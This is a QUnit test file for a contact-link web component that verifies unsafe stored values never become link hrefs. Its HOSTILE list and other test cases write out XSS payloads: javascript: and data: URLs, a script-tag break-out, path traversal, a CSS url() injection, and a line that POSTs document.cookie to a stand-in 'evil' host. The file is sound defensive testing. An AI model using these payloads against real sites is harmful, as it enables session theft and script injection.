// Pretui — proof for ink-contact.gts.
//
// The bulk of this file is one question asked many ways: **can a stored value
// become an href that does something other than what the link says?** The
// source this replaced pasted its value straight into `href`, so the answer
// there was yes. Every hostile shape below is asserted to produce no link at
// all — which is why they are enumerated rather than summarised.
//
// Run with `boxel test` from this directory; deployment leaves `*.test.gts`
// off the realm.
import { module, test } from 'qunit';
import { render } from '@ember/test-helpers';
import { setupCardTest } from '@cardstack/host/tests/helpers';
import { CONTACT_CHANNELS, ContactLink, channelFor, contactDisplay, contactHref, handleChannel } from './components/contact-link';
import { DEMOS_CONTACT_LINK } from './components/contact-link.usage';

// Pages are looked up by component name through the merged loadable registry,
// so this test does not care which module a page lives in.
const PAGES: Record<string, unknown> = { ...DEMOS_CONTACT_LINK };
const DEMOS_INK_CONTACT_NAMES = ['ContactLink'];

const EMAIL = CONTACT_CHANNELS['email'];
const PHONE = CONTACT_CHANNELS['phone'];
const SMS = CONTACT_CHANNELS['sms'];
const URL_CHANNEL = CONTACT_CHANNELS['url'];
const GITHUB = handleChannel('github', 'GitHub', 'https://github.com/');

/** Every shape that must NOT become a link. Written out rather than
 * generated, so a reader can see exactly what was checked. */
const HOSTILE = [
  'javascript:alert(1)',
  'JavaScript:alert(1)',
  '  javascript:alert(1)',
  'java\tscript:alert(1)',
  'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
  'vbscript:msgbox(1)',
  'file:///etc/passwd',
  'about:blank',
  'blob:https://example.com/x',
  "javascript:fetch('//evil',{method:'POST',body:document.cookie})",
];

function root(): HTMLElement {
  return document.querySelector('#ember-testing') as HTMLElement;
}
function link(): HTMLAnchorElement | null {
  return root().querySelector('a[data-test-pretui-contact]');
}

module('Pretui | ink-contact | nothing hostile becomes an href', function () {
  test('every dangerous scheme is refused on the URL channel', function (assert) {
    for (let value of HOSTILE) {
      assert.strictEqual(
        contactHref(URL_CHANNEL, value),
        undefined,
        value + ' produces no link',
      );
    }
  });

  test('and on every other channel too', function (assert) {
    for (let channel of [EMAIL, PHONE, SMS, GITHUB]) {
      for (let value of HOSTILE) {
        assert.strictEqual(
          contactHref(channel, value),
          undefined,
          channel?.id + ' refuses ' + value,
        );
      }
    }
  });

  test('a hostile value cannot ride in behind a plausible one', function (assert) {
    assert.strictEqual(
      contactHref(EMAIL, 'a@b.com, javascript:alert(1)'),
      undefined,
      'the address shape does not admit a second value',
    );
    assert.strictEqual(
      contactHref(PHONE, '+1 555 0100"><script>'),
      undefined,
      'a value carrying anything but number punctuation is not a number at all',
    );
    assert.strictEqual(
      contactHref(GITHUB, '../../evil'),
      undefined,
      'a handle shape admits no path traversal',
    );
    assert.strictEqual(
      contactHref(GITHUB, 'a@evil.com'),
      undefined,
      'nor an authority',
    );
  });

  test('the href a link claims is the href it carries', function (assert) {
    let href = contactHref(URL_CHANNEL, 'example.com/a?b=1#c');
    assert.strictEqual(href, 'https://example.com/a?b=1#c');
    assert.strictEqual(
      contactDisplay(URL_CHANNEL, 'https://www.example.com/a'),
      'example.com/a',
      'the display drops the scheme and the www, and is never used to build the href',
    );
  });
});

module('Pretui | ink-contact | the channels', function () {
  test('email', function (assert) {
    assert.strictEqual(contactHref(EMAIL, 'a.b+c@example.co.uk'), 'mailto:a.b%2Bc@example.co.uk');
    assert.strictEqual(contactHref(EMAIL, ' a@b.com '), 'mailto:a@b.com');
    assert.strictEqual(contactHref(EMAIL, 'mailto:a@b.com'), 'mailto:a@b.com');
    assert.strictEqual(contactHref(EMAIL, 'not an address'), undefined);
    assert.strictEqual(contactHref(EMAIL, 'a@b'), undefined, 'no dot, no domain');
    assert.strictEqual(contactHref(EMAIL, ''), undefined);
  });

  test('phone and sms rebuild the number from digits', function (assert) {
    assert.strictEqual(contactHref(PHONE, '+1 (555) 010-0199'), 'tel:+15550100199');
    assert.strictEqual(contactHref(PHONE, '020 7946 0000'), 'tel:02079460000');
    assert.strictEqual(contactHref(SMS, '+447700900000'), 'sms:+447700900000');
    assert.strictEqual(contactHref(PHONE, '12'), undefined, 'too short to be one');
    assert.strictEqual(
      contactHref(PHONE, '1234567890123456789012345'),
      undefined,
      'and too long',
    );
  });

  test('a handle channel is data, not a subclass', function (assert) {
    assert.strictEqual(contactHref(GITHUB, 'chris'), 'https://github.com/chris');
    assert.strictEqual(
      contactHref(GITHUB, '@chris'),
      'https://github.com/chris',
      'a leading at-sign is the same handle',
    );
    assert.strictEqual(contactDisplay(GITHUB, 'chris'), '@chris');
    assert.strictEqual(contactHref(GITHUB, 'a b'), undefined);
  });

  test('a bare host is the URL the reader meant', function (assert) {
    assert.strictEqual(
      contactHref(URL_CHANNEL, 'example.com'),
      'https://example.com/',
      'a bare host gets https',
    );
    assert.strictEqual(
      contactHref(URL_CHANNEL, 'http://example.com'),
      'http://example.com/',
      'an explicit http is kept rather than upgraded behind their back',
    );
    assert.strictEqual(
      contactHref(URL_CHANNEL, 'not a url at all'),
      undefined,
      'a sentence is not a URL — measured against Chromium, which parses one rather than throwing',
    );
    assert.strictEqual(
      contactHref(URL_CHANNEL, 'https://wiki'),
      undefined,
      'and a single-label host is refused, because accepting it accepts every typo that parses',
    );
    assert.strictEqual(
      contactHref(URL_CHANNEL, 'http://localhost:4200/x'),
      'http://localhost:4200/x',
      'except localhost, which is a real answer during development',
    );
  });

  test('channels resolve by a STABLE id, never by their label', function (assert) {
    assert.strictEqual(channelFor('email')?.id, 'email');
    assert.strictEqual(channelFor('EMAIL')?.id, 'email');
    assert.strictEqual(
      channelFor('Email address'),
      undefined,
      'a label is not a key — that is the lookup the source got wrong',
    );
    assert.strictEqual(channelFor(GITHUB)?.id, 'github', 'an object passes through');
    assert.strictEqual(channelFor(undefined), undefined);
    assert.strictEqual(contactHref(undefined, 'a@b.com'), undefined);
  });
});

module('Pretui | ink-contact | ContactLink', function (hooks) {
  setupCardTest(hooks);

  test('a resolvable value renders a real link with a real verb', async function (assert) {
    await render(
      <template>
        <ContactLink @channel='email' @value='ada@example.com' @name='Ada' />
      </template>,
    );
    let anchor = link();
    assert.strictEqual(anchor?.getAttribute('href'), 'mailto:ada@example.com');
    assert.true((anchor?.textContent ?? '').indexOf('ada@example.com') !== -1);
    let name = anchor?.getAttribute('aria-label') ?? '';
    assert.true(name.indexOf('Email') !== -1, name);
    assert.true(
      name.indexOf('Ada') !== -1,
      'the name disambiguates a row of otherwise identical links: ' + name,
    );
  });

  test('an unresolvable value is TEXT, never a dead link and never nothing', async function (assert) {
    await render(
      <template>
        <ContactLink @channel='url' @value='javascript:alert(1)' />
      </template>,
    );
    assert.strictEqual(link(), null, 'no anchor was created');
    let el = root().querySelector('[data-test-pretui-contact]');
    assert.strictEqual(el?.getAttribute('data-unresolved'), 'true');
    assert.true(
      (el?.textContent ?? '').indexOf('javascript:alert(1)') !== -1,
      'the value is still shown, because it is still information',
    );
    assert.true(
      (el?.textContent ?? '').indexOf('shown as text') !== -1,
      'with a note saying why',
    );
  });

  test('external channels carry the rel that makes them safe to open', async function (assert) {
    await render(
      <template><ContactLink @channel='url' @value='example.com' /></template>,
    );
    assert.strictEqual(link()?.getAttribute('target'), '_blank');
    assert.strictEqual(link()?.getAttribute('rel'), 'noopener noreferrer');
  });

  test('a mailto does not open a new context, because it does not navigate', async function (assert) {
    await render(
      <template><ContactLink @channel='email' @value='a@b.com' /></template>,
    );
    assert.strictEqual(link()?.getAttribute('target'), null);
  });

  test('the icon variant keeps an accessible name', async function (assert) {
    await render(
      <template>
        <ContactLink @channel='phone' @value='+15550100' @variant='icon' />
      </template>,
    );
    let anchor = link();
    assert.strictEqual(anchor?.getAttribute('data-variant'), 'icon');
    assert.strictEqual((anchor?.textContent ?? '').trim(), '', 'no visible text');
    assert.true(
      (anchor?.getAttribute('aria-label') ?? '').indexOf('Call') !== -1,
      'but a required name on an icon-only control',
    );
  });

  test('a caller hue reaches the treatment through the guard, and junk does not', async function (assert) {
    await render(
      <template>
        <ContactLink @channel='url' @value='example.com' @hue='#10b981' />
      </template>,
    );
    assert.strictEqual(
      link()?.style.getPropertyValue('--pretui-contact-hue').trim(),
      '#10b981',
    );
    await render(
      <template>
        <ContactLink
          @channel='url'
          @value='example.com'
          @hue='red; background: url(//evil)'
        />
      </template>,
    );
    assert.strictEqual(
      link()?.style.getPropertyValue('--pretui-contact-hue'),
      '',
      'an injection attempt is dropped whole rather than escaped',
    );
  });
});

module('Pretui | ink-contact | usage page', function (hooks) {
  setupCardTest(hooks);

  test('the demo renders', async function (assert) {
    for (let name of DEMOS_INK_CONTACT_NAMES) {
      /* eslint-disable-next-line @typescript-eslint/no-explicit-any -- the
         DEMOS registries are Record<string, unknown> by contract. */
      let Page = PAGES[name] as any;
      await render(<template><Page /></template>);
      assert.true(
        (root().textContent ?? '').indexOf(name) !== -1,
        name + ' renders and names itself',
      );
    }
  });
});
